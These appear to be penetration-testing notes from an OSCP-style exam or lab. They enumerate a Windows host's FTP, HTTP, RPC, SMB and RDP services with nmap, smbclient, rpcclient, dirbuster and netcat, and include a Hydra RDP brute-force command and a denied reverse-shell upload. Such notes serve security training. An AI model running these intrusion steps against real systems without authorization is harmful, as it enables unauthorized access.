	SF:t/html\r\n\r\n<h1>Not\x20Found\x20\(404\)</h1>\n<p>sip:nm</p>\n");
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	SF-Port9595-TCP:V=7.94%I=7%D=11/6%Time=65492DF1%P=x86_64-pc-linux-gnu%r(No
	SF:tesRPC,270,"\0\0\0J\0\x01\x05ID\0\0\x08Action\0\x0c\x05Password\0\0\x05
	SF:Session\0dd666dca-7cd0-11ee-830b-0050568a5552\0\0\0\0\0J\0\x01\x05ID\0\
	SF:0\x08Action\0\x0c\x05Password\0\0\x05Session\0dd68d02e-7cd0-11ee-abff-0
	SF:050568a5552\0\0\0\0\0J\0\x01\x05ID\0\0\x08Action\0\x0c\x05Password\0\0\
	SF:x05Session\0dd68d030-7cd0-11ee-9dec-0050568a5552\0\0\0\0\0J\0\x01\x05ID
	SF:\0\0\x08Action\0\x0c\x05Password\0\0\x05Session\0dd6b3288-7cd0-11ee-957
	SF:3-0050568a5552\0\0\0\0\0J\0\x01\x05ID\0\0\x08Action\0\x0c\x05Password\0
	SF:\0\x05Session\0dd6b3289-7cd0-11ee-9770-0050568a5552\0\0\0\0\0J\0\x01\x0
	SF:5ID\0\0\x08Action\0\x0c\x05Password\0\0\x05Session\0dd6b328a-7cd0-11ee-
	SF:97f9-0050568a5552\0\0\0\0\0J\0\x01\x05ID\0\0\x08Action\0\x0c\x05Passwor
	SF:d\0\0\x05Session\0dd6d94d8-7cd0-11ee-a97e-0050568a5552\0\0\0\0\0J\0\x01
	SF:\x05ID\0\0\x08Action\0\x0c\x05Password\0\0\x05Session\0dd6d94d9-7cd0-11
	SF:ee-883f-0050568a5552\0\0");
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2023-11-06T18:19:02
	|_  start_date: N/A

### Port 21 - FTP

```sh
sudo nmap -sV --script "ftp-*" -p 21 -T5 192.168.128.101
```
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     Microsoft ftpd
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_03-21-22  01:45AM             38100936 ServerSetup-3.9.0.2463.exe
	| ftp-syst: 
	|_  SYST: Windows_NT
	| ftp-brute: 
	|   Accounts: No valid accounts found
	|_  Statistics: Performed 4273 guesses in 230 seconds, average tps: 24.6

```sh
ftp 192.168.128.101
```
	Connected to 192.168.128.101.
	220 Microsoft FTP Service
	Name (192.168.128.101:kali): anonymous
	Password: (No Password)

Check for credentials
```ftp
ls -a
```
	229 Entering Extended Passive Mode (|||56295|)
	150 Opening ASCII mode data connection.
	03-21-22  01:45AM             38100936 ServerSetup-3.9.0.2463.exe

Get all files in the most stable way
```sh
wget -r --user="anonymous" --password="anonymous" ftp://192.168.128.101
```
	2023-11-07 06:48:37 (16.7 MB/s) - ‘192.168.128.101/.listing’ saved [134]
	2023-11-07 06:51:16 (236 KB/s) - ‘192.168.128.101/ServerSetup-3.9.0.2463.exe’ saved [38100936]
	FINISHED --2023-11-07 06:51:16--
	Total wall clock time: 2m 40s
	Downloaded: 2 files, 36M in 2m 38s (236 KB/s)
Saved to /192.168.128.101

Try uploading a reverse shell
```ftp
put /tmp/rev.sh
```
	local: /tmp/rev.sh remote: /tmp/rev.sh
	229 Entering Extended Passive Mode (|||56305|)
	550 Access is denied.

Resources:
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
### Port 80 - Website
	PORT     STATE SERVICE VERSION
	80/tcp    open  http          Microsoft IIS httpd 10.0
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows

![[Pasted image 20231107052231.png]]
Clear hint it's a windows
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS Windows</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#0072C6;
	margin:0;
}
#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}
a img {
	border:none;
}
-->
</style>
</head>
<body>
<div id="container">
<a href="[http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409](view-source:http://go.microsoft.com/fwlink/?linkid=66138&clcid=0x409)"><img src="[iisstart.png](view-source:http://192.168.128.101/iisstart.png)" alt="IIS" width="960" height="600" /></a>
</div>
</body>
</html>
Website source links to Microsoft's website

URL: http://192.168.128.101 
```sh
dirbuster
```
- Threads `100`
- Word list location `
```ini
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![[Pasted image 20231107052021.png]]
No Active Website aside from home page
### Port 135 - RPC Data
135/tcp   open  msrpc         Microsoft Windows RPC

Null session
```sh
rpcclient -U "" 192.168.128.101 
```
	Password for [WORKGROUP\]:
	Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

Guest session
```sh
rpcclient -U "guest" 192.168.128.101
```
	Password for [WORKGROUP\guest]:
	Cannot connect to server.  Error was NT_STATUS_ACCOUNT_DISABLED

Check info dump and match against escalation sequences 
```sh
rpcdump.py 192.168.128.101 -port 135 | uniq | grep -E 'ncacn_ip_tcp|ncadg_ip_udp|ncacn_np|ncacn_http'
```
	  ncacn_ip_tcp:192.168.128.101[49670]
	  ncacn_ip_tcp:192.168.128.101[49664]
	  ncacn_np:\\MS01[\pipe\lsass]
	  ncacn_ip_tcp:192.168.128.101[49670]
	  ncacn_ip_tcp:192.168.128.101[49664]
	  ncacn_np:\\MS01[\pipe\lsass]
	  ncacn_ip_tcp:192.168.128.101[49670]
	  ncacn_ip_tcp:192.168.128.101[49664]
	  ncacn_np:\\MS01[\pipe\lsass]
	  ncacn_ip_tcp:192.168.128.101[49670]
	  ncacn_ip_tcp:192.168.128.101[49664]
	  ncacn_np:\\MS01[\pipe\lsass]
	  ncacn_ip_tcp:192.168.128.101[49670]
	  ncacn_ip_tcp:192.168.128.101[49664]
	  ncacn_np:\\MS01[\pipe\lsass]
	  ncacn_ip_tcp:192.168.128.101[49664]
	  ncacn_np:\\MS01[\pipe\lsass]
	  ncacn_ip_tcp:192.168.128.101[49665]
	  ncacn_np:\\MS01[\PIPE\InitShutdown]
	  ncacn_np:\\MS01[\PIPE\InitShutdown]
	  ncacn_ip_tcp:192.168.128.101[49666]
	  ncacn_np:\\MS01[\pipe\eventlog]
	  ncacn_ip_tcp:192.168.128.101[49667]
	  ncacn_np:\\MS01[\PIPE\atsvc]
	  ncacn_ip_tcp:192.168.128.101[49667]
	  ncacn_np:\\MS01[\PIPE\atsvc]
	  ncacn_np:\\MS01[\PIPE\atsvc]
	  ncacn_np:\\MS01[\PIPE\atsvc]
	  ncacn_np:\\MS01[\PIPE\atsvc]
	  ncacn_np:\\MS01[\PIPE\wkssvc]
	  ncacn_ip_tcp:192.168.128.101[49668]
	  ncacn_np:\\MS01[\pipe\SessEnvPublicRpc]
	  ncacn_ip_tcp:192.168.128.101[49669]
	  ncacn_ip_tcp:192.168.128.101[49669]
	  ncacn_ip_tcp:192.168.128.101[49669]
	  ncacn_ip_tcp:192.168.128.101[49669]
	  ncacn_ip_tcp:192.168.128.101[49669]
	  ncacn_ip_tcp:192.168.128.101[49671]
	  ncacn_np:\\MS01[\PIPE\ROUTER]
	  ncacn_ip_tcp:192.168.128.101[51393]
	Filtered from 367 endpoints.


### Port 139 - NetBIOS / Samba Legacy
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

run nmap scripts for smb services which enumerates shares and checks for eternal blue
```sh
nmap -Pn -p139 -T5 --script=smb-vuln-ms17-010,smb-enum-shares,smb-enum-users,smb-enum-domains,smb-brute --open 192.168.128.101 -v -oN smb139Scripts.nmap
```
Returns nothing more that the port scan above

`smbmap` Guest & null checks

Null
```
smbmap -H 192.168.128.101 -P 139
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s) 

Guest
```
smbmap -H 192.168.128.101 -u guest -p "" -P 139
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s)

`smbclient` Guest and null checks

Null
```sh
smbclient -L 192.168.128.101 -p 139
```
	do_connect: Connection to 192.168.128.111 failed (ErrorNT_STATUS_RESOURCE_NAME_NOT_FOUND)

Guest
```sh
smbclient -L 192.168.128.101 -p 139 --user guest
```
	do_connect: Connection to 192.168.128.101 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

Finding Server Names
```sh
nmblookup -A 192.168.128.101 && nbtscan 192.168.128.101/30 && nmap -sU -sV -T4 --script nbstat.nse -p 139 -Pn -n 192.168.128.101
```

Digging for info
```
enum4linux -a 192.168.128.101
```
No results

### Port 445 - Samba / SMB 
445/tcp   open  microsoft-ds?

run nmap scripts for smb services which enumerates shares and checks for eternal blue
```sh
nmap -sV -Pn -p445 -T5 --script="smb-*" --open 192.168.128.101 -v -oN smb445Scripts.nmap
```
Returns nothing more that the port scan above

`smbmap` Guest & null checks

Null
```
smbmap -H 192.168.128.101
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s) 

Guest
```
smbmap -H 192.168.128.101 -u guest -p ""
```
	[*] Detected 1 hosts serving SMB
	[*] Established 0 SMB session(s)

`smbclient` Guest and null checks

Guest
```sh
smbclient -L 192.168.128.101 --user guest
```
	Password for [WORKGROUP\guest]:          
	session setup failed: NT_STATUS_ACCOUNT_DISABLED

Null
```sh
smbclient -L 192.168.128.101
```
	Password for [WORKGROUP\kali]:                                               
	session setup failed: NT_STATUS_ACCESS_DENIED
### Port 3389 - RDP
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-11-06T18:19:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Issuer: commonName=MS01.oscp.exam
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-05T17:19:05
| Not valid after:  2024-05-06T17:19:05
| MD5:   bbd6:3041:aa23:79dc:03e6:362b:eb54:9cfc
|_SHA-1: 72b2:0234:ca40:c40e:0723:78c0:5c1d:d4d2:5616:568f
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: **MS01.oscp.exam**
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.19041
|_  System_Time: 2023-11-06T18:19:03+00:00

Got a computer name and a domain `MS01.oscp.exam`


```sh
nmap --script "rdp-*" -p 3389 -T4 192.168.128.101
```
	PORT     STATE SERVICE
	3389/tcp open  ms-wbt-server
	| rdp-enum-encryption: 
	|   Security layer
	|     CredSSP (NLA): SUCCESS
	|     CredSSP with Early User Auth: SUCCESS
	|_    RDSTLS: SUCCESS
	| rdp-ntlm-info: 
	|   Target_Name: OSCP
	|   NetBIOS_Domain_Name: OSCP
	|   NetBIOS_Computer_Name: MS01
	|   DNS_Domain_Name: oscp.exam
	|   DNS_Computer_Name: MS01.oscp.exam
	|   DNS_Tree_Name: oscp.exam
	|   Product_Version: 10.0.19041
	|_  System_Time: 2023-11-07T06:15:33+00:00

Hydra RDP Brute
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/db2-betterdefaultpasslist.txt 192.168.128.101 rdp
```

Connection to RDP
```sh
xfreerdp /compression +auto-reconnect /u:guest /d:oscp.com /v:192.168.128.101
```

Resources
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
### Port 5040 - Unknown - API Range
5040/tcp  open  unknown
```
nc 92.168.128.101 5040 
```
	test
	no response

### Port 8080 - Web Proxied
8080/tcp  open  http          Microsoft IIS httpd 10.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

![[Pasted image 20231107055102.png]]
Same site as on 80

Source code is the same

```sh
dirbuster
```

- URL: 
```ini
http://192.168.128.101:8080
```
- Threads `77` 
	- Any higher may DOS the server and kill the VPN connection
- Word list location `
```ini
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

No Active Website aside from home page

### Port 9510 - RTSP Streams
	9510/tcp  open  rtsp

Banner grab say it's http (Hit Enter After)
```
nc 92.168.128.101 9510
```
	test
	HTTP/1.1 400 Bad Request
	Connection: Close


```sh
dirbuster
```

- URL: 
```ini
http://192.168.128.101:9510
```
- Threads `77` 
	- Any higher may DOS the server and kill the VPN connection
- Word list location `
```ini
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```
	/web/
	/system/
	/client/
Maybe it's an api?



### Port 9512 - Unknown
9512/tcp  open  unknown

Banner grab test
```
nc 92.168.128.101 9512
```
	test
	no error message
	no feedback


### Port 9595 - Unknown
9595/tcp  open  pds?
| fingerprint-strings: 
|   NotesRPC: 
|     Action
|     Password
|     Session
|     dd666dca-7cd0-11ee-830b-0050568a5552

Banner grab test
```
nc 92.168.128.101 9595
```
	test
	no error message
	no response

### Ports 49664-51393 - Microsoft RPC
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	51393/tcp open  msrpc         Microsoft Windows RPC

## 172.16.128.100 - MS02

## 172.16.128.102 - Domain Controller


